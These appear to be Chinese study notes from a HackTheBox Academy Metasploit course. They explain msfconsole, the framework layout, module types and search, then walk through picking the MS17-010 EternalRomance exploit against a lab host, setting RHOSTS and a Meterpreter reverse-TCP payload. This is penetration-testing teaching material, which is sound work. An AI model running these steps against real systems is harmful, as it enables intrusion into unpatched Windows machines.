#metasploit #hacking [source](https://academy.hackthebox.com/module/39/section/381)

在安全行业的社交媒体圈子中，关于工具的讨论最近引发了激烈的争论。一些讨论围绕着某些群体的个人偏好展开，而另一些则旨在评估向公众披露工具的政策。尽管如此，有必要指出自动化工具在当今行业中的重要性。

我们确实听过或将会听到的普遍观点是，在安全评估期间使用自动化工具不是正确的选择。这是因为它们使安全分析师或渗透测试人员在与易受攻击的环境交互时没有机会"证明"自己。此外，许多人认为工具使审计人员的工作变得太简单，以至于他们的评估无法获得任何认可。

另一个直言不讳的群体持不同意见——他们由信息安全社区的新成员组成，这些人刚刚起步并迈出第一步，还有那些坚持认为工具通过为我们提供更用户友好的方式来应对野外存在的大量漏洞，从而帮助我们更好地学习，同时为评估中更复杂的部分节省时间的人。我们也将采取这种对抗性的方法来看待这个问题。

工具确实在某些情况下可能给我们带来一些缺点：

- 创造一个难以突破的舒适区来学习新技能

- 仅仅因为它们在网上公开发布供所有人查看和使用而带来安全风险

- 产生隧道视野效应。`如果工具做不到，我也做不到。`


就像在其他行业中创意工作可以与自动化任务相结合一样，作为新用户，工具可能会限制我们的视野和行动。我们可能会错误地"学习"到它们能为所有问题提供解决方案，并开始越来越依赖它们。这反过来会产生隧道视野效应（Tunnel Vision，指只关注眼前事物而忽略其他可能性的认知偏差），这可能并且将会限制用户在评估中可能考虑和采取的交互方式。

与此同时，越来越多的这些自动化工具进入公共领域（参见NSA向公众发布安全工具），这为几乎不了解该行业的潜在恶意行为者创造了更多可能性，让他们能够基于快速获利的欲望或在充满小人物的暗室中炫耀自己的成就而采取行动。

---

## 自律

如果从当前信息安全行业的现状中可以得出任何判断因素，那就是我们正处于现有技术、协议和系统持续加速演进之中。考虑到我们在评估过程中遇到的大量环境变量，必须在可能的地方节省时间，并为审计人员形成强大的安全范式。自律在所有工作领域都至关重要，结论如下：

||
|---|
|我们永远没有足够的时间来完成评估。由于每种环境变化中使用的技术数量众多，我们不会被给予足够的时间来进行完整、全面的评估。时间就是金钱，我们在为非技术精通的客户计时工作，我们需要首先完成大部分工作：具有最大潜在影响和最高修复周转率的问题。|
|即使我们制作自己的工具或手动利用每个服务，可信度也可能是个问题。我们不是在与其他行业成员竞争，而是在与客户管理层面的预设经济条件和个人信念竞争。他们不会理解或重视荣誉。他们只是想在最短的时间内完成尽可能多的工作。|
|你只需要让自己满意，而不是让信息安全社区满意。如果我们实现了前者，后者自然会随之而来。使用与上面相同的例子，许多有在线影响力的艺术家为了追求在线认可而偏离了他们的原始目标。他们的艺术在敏锐的眼光看来变得陈旧和通用，但对于普通用户来说，它包含了想要的视觉元素和主题，而不是他们的追随者尚不知道自己想要的那些。作为安全研究人员或渗透测试人员，我们只需要验证漏洞，而不是验证我们的自尊心。|

---

## 结论

我们必须深入分析和了解我们的工具，以掩盖我们的踪迹并避免在评估期间发生灾难性事件。许多工具可能被证明是不可预测的。有些可能在目标系统上留下活动痕迹，有些可能使我们的攻击平台门户大开。然而，只要我们遵循这里的规则，它们可以成为初学者宝贵的教育平台和专业人士所需的省时机制。

不要产生隧道视野。将工具作为工具使用，而不是作为我们完整评估的骨干或生命支持。

请阅读所有能找到的关于我们任何工具的技术文档。请深入了解它们。不要放过任何细节（或函数或类）。这将帮助我们避免意外行为或惹恼客户以及面对一群律师。

假设我们审计我们的工具并为初步检查和攻击路径建立一套可靠的方法论。在这种情况下，工具将为我们节省时间以进行进一步研究，并对我们的安全研究范式进行持久而具体的探索。考虑到当今环境中越来越多技术出现的加速步伐，这种进一步的研究应该专注于更深入地理解安全机制，将我们的审计推向更抽象的安全对象，扩大分析的范围。这就是我们作为专业人士的进化方式。#metasploit #hacking [source](https://academy.hackthebox.com/module/39/section/383)


---

`Metasploit Project`（Metasploit项目）是一个基于Ruby的模块化渗透测试平台，使您能够编写、测试和执行漏洞利用代码。这些漏洞利用代码可以由用户自定义制作，也可以从包含最新已发现和模块化漏洞利用的数据库中获取。`Metasploit Framework`（Metasploit框架）包含一套工具，您可以使用这些工具来测试安全漏洞、枚举网络、执行攻击和规避检测。其核心是，`Metasploit Project`是一个常用工具的集合，为渗透测试和漏洞利用开发提供了完整的环境。

![img](https://academy.hackthebox.com/storage/modules/39/S02_SS01.png)

上述提到的`modules`（模块）是实际的漏洞利用概念验证，它们已经在野外开发和测试，并集成到框架中，以便渗透测试人员能够轻松访问不同平台和服务的不同攻击向量。Metasploit不是万能的，而是一把瑞士军刀，刚好有足够的工具让我们通过最常见的未修补漏洞。

它的强项在于提供大量可用的目标和版本，只需几个命令就能成功获得立足点。这些与为这些易受攻击版本量身定制的漏洞利用程序相结合，加上在漏洞利用后发送的payload（有效载荷，即攻击成功后在目标系统上执行的代码），将为我们提供实际的系统访问权限，为我们在后渗透活动中以与在互联网浏览器上看到标签页相同的方式使用会话和作业在目标连接之间轻松自动切换提供便利。

---

## Metasploit Pro

`Metasploit`作为产品分为两个版本。`Metasploit Pro`版本与`Metasploit Framework`版本不同，具有一些额外功能：

- Task Chains（任务链）
- Social Engineering（社会工程学）
- Vulnerability Validations（漏洞验证）
- GUI（图形用户界面）
- Quick Start Wizards（快速启动向导）
- Nexpose Integration（Nexpose集成）

如果你更喜欢命令行用户并且想要额外功能，Pro版本也包含自己的控制台，类似于`msfconsole`。

要大致了解Metasploit Pro最新功能可以实现什么，请查看以下列表：

|**Infiltrate（渗透）**|**Collect Data（收集数据）**|**Remediate（修复）**|
|---|---|---|
|Manual Exploitation（手动利用）|Import and Scan Data（导入和扫描数据）|Bruteforce（暴力破解）|
|Anti-virus Evasion（防病毒规避）|Discovery Scans（发现扫描）|Task Chains（任务链）|
|IPS/IDS Evasion（IPS/IDS规避）|Meta-Modules（元模块）|Exploitation Workflow（利用工作流）|
|Proxy Pivot（代理跳板）|Nexpose Scan Integration（Nexpose扫描集成）|Session Rerun（会话重新运行）|
|Post-Exploitation（后渗透）||Task Replay（任务重放）|
|Session Clean-up（会话清理）||Project Sonar Integration（Project Sonar集成）|
|Credentials Reuse（凭据重用）||Session Management（会话管理）|
|Social Engineering（社会工程学）||Credential Management（凭据管理）|
|Payload Generator（有效载荷生成器）||Team Collaboration（团队协作）|
|Quick Pen-testing（快速渗透测试）||Web Interface（Web界面）|
|VPN Pivoting（VPN跳板）||Backup and Restore（备份和恢复）|
|Vulnerability Validation（漏洞验证）||Data Export（数据导出）|
|Phishing Wizard（钓鱼向导）||Evidence Collection（证据收集）|
|Web App Testing（Web应用测试）||Reporting（报告）|
|Persistent Sessions（持久会话）||Tagging Data（数据标记）|

---

## Metasploit Framework Console

`msfconsole`可能是`Metasploit Framework`（`MSF`）最流行的接口。它提供一个"一体化"的集中控制台，让您能够高效访问`MSF`中几乎所有可用的选项。`Msfconsole`起初可能看起来令人生畏，但一旦你学会了命令的语法，你就会学会欣赏使用这个接口的强大功能。

`msfconsole`通常带来的功能如下：

- 它是访问`Metasploit`中大多数功能的唯一受支持方式

- 为`Framework`提供基于控制台的接口

- 包含最多的功能，是最稳定的`MSF`接口

- 完整的readline支持、Tab补全和命令补全

- 在`msfconsole`中执行外部命令


上述两种产品都带有大量可用于我们评估的模块数据库。这些与外部命令（如扫描器、社会工程工具包和有效载荷生成器）的使用相结合，可以将我们的设置变成一台随时准备攻击的机器，使我们能够以与在互联网浏览器上看到标签页相同的方式使用会话和作业，无缝控制和操纵野外的不同漏洞。

这里的关键术语是可用性——用户体验。我们控制控制台的便捷程度可以提高我们的学习体验。因此，让我们深入了解具体内容。

---

## 理解架构

要完全操作我们使用的任何工具，我们必须首先查看其内部结构。这是一个好习惯，它可以让我们更好地了解在安全评估期间当该工具发挥作用时会发生什么。重要的是不要有[任何可能使您或您的客户暴露于数据泄露的未知因素](https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/)。

默认情况下，与Metasploit Framework相关的所有基础文件都可以在我们的`ParrotOS Security`发行版中的`/usr/share/metasploit-framework`下找到。

#### Data、Documentation、Lib

这些是框架的基础文件。Data和Lib是msfconsole接口的功能部分，而Documentation文件夹包含有关该项目的所有技术细节。

#### Modules

上面详述的模块在此文件夹中分为不同的类别。我们将在接下来的部分中详细介绍这些内容。它们包含在以下文件夹中：

Modules

```shell-session
tr01ax@htb[/htb]$ ls /usr/share/metasploit-framework/modules

auxiliary  encoders  evasion  exploits  nops  payloads  post
```

#### Plugins

Plugins（插件）为渗透测试人员在使用`msfconsole`时提供更多灵活性，因为它们可以根据需要轻松手动或自动加载，以在评估期间提供额外的功能和自动化。

Plugins

```shell-session
tr01ax@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/

aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
auto_add_route.rb  lab.rb         request.rb           thread.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
```

#### Scripts

Meterpreter功能和其他有用的脚本。

Scripts

```shell-session
tr01ax@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/

meterpreter  ps  resource  shell
```

#### Tools

可以直接从`msfconsole`菜单调用的命令行实用程序。

Tools

```shell-session
tr01ax@htb[/htb]$ ls /usr/share/metasploit-framework/tools/

context  docs     hardware  modules   payloads
dev      exploit  memdump   password  recon
```

现在我们知道了所有这些位置，当我们决定导入新模块甚至从头创建新模块时，将很容易引用它们。#metasploit #msfconsole #hacking [source](https://academy.hackthebox.com/module/39/section/384)


---

要开始与Metasploit Framework交互，我们需要在我们选择的终端中输入`msfconsole`。许多面向安全的发行版，如Parrot Security和Kali Linux，都预装了`msfconsole`。与任何其他命令行工具一样，我们可以在启动脚本时使用多个其他选项。这些选项从图形显示开关/选项到程序性选项不等。

---

## 准备工作

启动`msfconsole`后，我们会看到他们的标志性启动画面和命令行提示符，等待我们的第一个命令。

#### 启动MSFconsole

Launching MSFconsole

```shell-session
tr01ax@htb[/htb]$ msfconsole

                                              `:oDFo:`
                                           ./ymM0dayMmy/.
                                        -+dHJ5aGFyZGVyIQ==+-
                                    `:sm⏣~~Destroy.No.Data~~s:`
                                 -+h2~~Maintain.No.Persistence~~h+-
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:
                      :we're.all.alike'`                     The.PFYroy.No.D7:
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:
                      :---srwxrwx:-.`                        `MS146.52.No.Per:
                      :<script>.Ac816/                        sENbove3101.404:
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:
                      :09.14.2011.raid                       /STFU|wall.No.Pr:
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:
                      :#OUTHOUSE-  -s:                       /corykennedyData:
                      :$nmap -oS                              SSo.6178306Ence:
                      :Awsm.da:                            /shMTl#beats3o.No.:
                      :Ring0:                             `dDestRoyREXKC3ta/M:
                      :23d:                               sSETEC.ASTRONOMYist:
                       /-                        /yo-    .ence.N:(){ :|: & };:
                                                 `:Shall.We.Play.A.Game?tron/
                                                 ```-ooy.if1ghtf0r+ehUser5`
                                               ..th3.H1V3.U2VjRFNN.jMh+.`
                                              `MjM~~WE.ARE.se~~MMjMs
                                               +~KANSAS.CITY's~-`
                                                J~HAKCERS~./.`
                                                .esc:wq!:`
                                                 +++ATH`
                                                  `


       =[ metasploit v6.1.9-dev                           ]
+ -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the last opened session

msf6 >
```

或者，我们可以使用`-q`选项，它不会显示横幅。

Launching MSFconsole

```shell-session
tr01ax@htb[/htb]$ msfconsole -q

msf6 >
```

要更好地查看所有可用命令，我们可以输入`help`命令。首先，我们的工具需要保持锋利。我们需要做的第一件事之一是确保组成框架的模块是最新的，并且可以导入任何公开可用的新模块。

旧的方法是在我们的操作系统终端（在`msfconsole`之外）运行`msfupdate`。然而，`apt`包管理器目前可以轻松处理模块和功能的更新。

#### 安装MSF

Installing MSF

```shell-session
tr01ax@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework

<SNIP>

(Reading database ... 414458 files and directories currently installed.)
Preparing to unpack .../metasploit-framework_6.0.2-0parrot1_amd64.deb ...
Unpacking metasploit-framework (6.0.2-0parrot1) over (5.0.88-0kali1) ...
Setting up metasploit-framework (6.0.2-0parrot1) ...
Processing triggers for man-db (2.9.1-1) ...
Scanning application launchers
Removing duplicate launchers from Debian
Launchers are updated
```

我们将在本模块中介绍的第一步之一是为我们的`target`（目标）搜索合适的`exploit`（漏洞利用程序）。然而，在尝试任何利用之前，我们需要对`target`本身有详细的了解。这涉及到`Enumeration`（枚举）过程，它先于任何类型的利用尝试。

在`Enumeration`期间，我们必须查看我们的目标并识别其上运行的面向公众的服务。例如，它是HTTP服务器吗？它是FTP服务器吗？它是SQL数据库吗？这些不同的`target`类型在现实世界中差异很大。我们需要从对目标IP地址的彻底`scan`（扫描）开始，以确定正在运行什么服务以及每个服务安装了什么版本。

随着我们的深入，我们会注意到版本是`Enumeration`过程中的关键组成部分，它们将使我们能够确定目标是否易受攻击。以前易受攻击的服务的未修补版本或公开可访问平台中的过时代码通常是我们进入`target`系统的入口点。

---

## MSF参与结构

MSF参与结构可以分为五个主要类别。

- Enumeration（枚举）
- Preparation（准备）
- Exploitation（利用）
- Privilege Escalation（权限提升）
- Post-Exploitation（后渗透）

这种划分使我们更容易以更结构化的方式找到和选择适当的MSF功能，并相应地使用它们。这些类别中的每一个都有不同的子类别，用于特定目的。例如，这些包括服务验证和漏洞研究。

因此，熟悉这种结构至关重要。因此，我们将查看此框架的组件以更好地理解它们之间的关系。

![image](https://academy.hackthebox.com/storage/modules/39/S04_SS03.png)

我们将在模块中逐一介绍这些类别，但我们建议自己查看各个组件并深入挖掘。尝试不同的功能是学习新工具或技能的重要组成部分。因此，我们应该在以下实验中尝试所有可以想象的事情，并独立分析结果。#metasploit #hacking [source](https://academy.hackthebox.com/module/39/section/404)

正如我们之前提到的，Metasploit `modules`（模块）是具有特定目的和相应功能的预先准备好的脚本，它们已经在野外开发和测试过。`exploit`类别由所谓的概念验证（`POCs`，Proof-of-Concepts）组成，可用于以很大程度上自动化的方式利用现有漏洞。许多人经常认为漏洞利用失败就否定了疑似漏洞的存在。然而，这只能证明Metasploit漏洞利用程序不起作用，而不是漏洞不存在。这是因为许多漏洞利用程序需要根据目标主机进行定制才能使漏洞利用生效。因此，像Metasploit框架这样的自动化工具只应被视为支持工具，而不是我们手动技能的替代品。

一旦我们进入`msfconsole`，我们可以从包含所有可用Metasploit模块的广泛列表中进行选择。每个模块都被结构化为文件夹，看起来像这样：

Syntax

```shell-session
<No.> <type>/<os>/<service>/<name>
```

Example

```shell-session
794   exploit/windows/ftp/scriptftp_list
```

#### Index No.

`No.`标签将在我们搜索后显示，以便选择我们之后想要的漏洞利用程序。我们稍后会看到`No.`标签在选择特定Metasploit模块时有多么有用。

#### Type

`Type`标签是Metasploit `modules`之间的第一级分隔。通过查看此字段，我们可以判断此模块的代码将完成什么。其中一些`types`不能像`exploit`模块那样直接使用。然而，它们的设置是为了在可交互的模块旁边介绍结构，以实现更好的模块化。为了更好地解释，以下是可能出现在此字段中的可能类型：

|**Type**|**Description（描述）**|
|---|---|
|`Auxiliary`|扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。|
|`Encoders`|确保有效载荷完整到达目的地。|
|`Exploits`|定义为利用漏洞以允许有效载荷交付的模块。|
|`NOPs`|（No Operation code，无操作代码）在漏洞利用尝试中保持有效载荷大小一致。|
|`Payloads`|远程运行并回调到攻击者机器以建立连接（或shell）的代码。|
|`Plugins`|可以在`msfconsole`中集成到评估中并共存的附加脚本。|
|`Post`|用于收集信息、深入渗透等的广泛模块阵列。|

请注意，在选择用于有效载荷交付的模块时，`use <no.>`命令只能与以下可用作`initiators`（启动器，或可交互模块）的模块一起使用：

|**Type**|**Description（描述）**|
|---|---|
|`Auxiliary`|扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。|
|`Exploits`|定义为利用漏洞以允许有效载荷交付的模块。|
|`Post`|用于收集信息、深入渗透等的广泛模块阵列。|

#### OS

`OS`标签指定模块是为哪个操作系统和架构创建的。自然，不同的操作系统需要运行不同的代码才能获得所需的结果。

#### Service

`Service`标签指的是目标机器上运行的易受攻击的服务。对于某些模块，如`auxiliary`或`post`模块，此标签可以指更一般的活动，如`gather`，指的是收集凭据等。

#### Name

最后，`Name`标签解释了使用此为特定目的创建的模块可以执行的实际操作。

---

## 搜索模块

Metasploit还为现有模块提供了完善的搜索功能。借助此功能，我们可以使用特定的`tags`快速搜索所有模块，以找到适合我们目标的模块。

#### MSF - 搜索功能

MSF - Search Function

```shell-session
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
  -h                   Show this help information
  -o <file>            Send output to a file in csv format
  -S <string>          Regex pattern used to filter search results
  -u                   Use module if there is one result
  -s <search_column>   Sort the research results based on <search_column> in ascending order
  -r                   Reverse the search results order to descending order

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

例如，我们可以尝试为较旧的Windows操作系统找到`EternalRomance`漏洞利用程序。这可能看起来像这样：

---

#### MSF - 搜索EternalRomance

MSF - Searching for EternalRomance

```shell-session
msf6 > search eternalromance

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution



msf6 > search eternalromance type:exploit

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

我们还可以使搜索更加粗略，并将其减少到一个服务类别。例如，对于CVE，我们可以指定年份（`cve:<year>`）、平台Windows（`platform:<os>`）、我们想要找到的模块类型（`type:<auxiliary/exploit/post>`）、可靠性等级（`rank:<rank>`）和搜索名称（`<pattern>`）。这会将我们的结果减少到仅匹配上述所有条件的结果。

#### MSF - 特定搜索

MSF - Specific Search

```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

---

## 模块选择

要选择我们的第一个模块，我们首先需要找到一个。假设我们有一个目标运行的SMB版本容易受到EternalRomance（MS17_010）漏洞利用的攻击。在扫描目标时，我们发现SMB服务器端口445是开放的。

MSF - Specific Search

```shell-session
tr01ax@htb[/htb]$ nmap -sV 10.10.10.40

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.10.10.40
Host is up (0.051s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds
```

我们需要启动 `msfconsole` 并搜索这个确切的漏洞利用名称。

#### MSF - 搜索 MS17_010

MSF - Search for MS17_010

```shell-session
msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
```

接下来，我们要为这个场景选择适当的模块。从 `Nmap` 扫描中，我们已经检测到运行版本为 `Microsoft Windows 7 - 10` 的 SMB（Server Message Block，服务器消息块协议）服务。通过一些额外的操作系统扫描，我们可以推测这是一台运行着存在漏洞的 SMB 实例的 Windows 7 系统。然后我们继续选择 `索引号 2` 的模块来测试目标是否存在漏洞。

---

## 使用模块

在交互式模块中，有多个选项可供我们指定。这些选项用于将 Metasploit 模块适配到给定的环境。因为在大多数情况下，我们总是需要扫描或攻击不同的 IP 地址。因此，我们需要这种功能来允许我们设置目标并进行微调。要检查在漏洞利用发送到目标主机之前需要设置哪些选项，我们可以使用 `show options` 命令。在漏洞利用发生之前需要设置的所有内容都会在 `Required` 列下显示 `Yes`。

#### MSF - 选择模块

MSF - Select Module

```shell-session

<SNIP>

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution


msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

在这里我们可以看到 `No.` 标签有多么有用。因为现在，我们不必输入整个路径，只需输入在搜索中分配给 Metasploit 模块的编号。如果我们想了解更多关于该模块的信息，可以在选择模块后使用 `info` 命令。这将为我们提供一系列可能对我们很重要的信息。

#### MSF - 模块信息

MSF - Module Information

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                          Required  Description
  ----                  ---------------                          --------  -----------
  DBGTRACE              false                                    yes       Show extra debug trace info
  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                        rdlists/named_pipes.txt
  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                           wiki/Using-Metasploit
  RPORT                 445                                      yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                           no        The service display name
  SERVICE_NAME                                                   no        The service name
  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                           mal read/write folder share
  SMBDomain             .                                        no        The Windows domain to use for authentication
  SMBPass                                                        no        The password for the specified username
  SMBUser                                                        no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to
  achieve a write-what-where primitive. This will then be used to
  overwrite the connection session information with as an
  Administrator session. From there, the normal psexec payload code
  execution is done. Exploits a type confusion between Transaction and
  WriteAndX requests and a race condition in Transaction requests, as
  seen in the EternalRomance, EternalChampion, and EternalSynergy
  exploits. This exploit chain is more reliable than the EternalBlue
  exploit, but requires a named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
```

在我们确认所选模块适合我们的目的后，我们需要设置一些规格来自定义模块，以便成功地针对目标主机使用它，例如设置目标（`RHOST` 或 `RHOSTS`）。

#### MSF - 目标指定

MSF - Target Specification

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

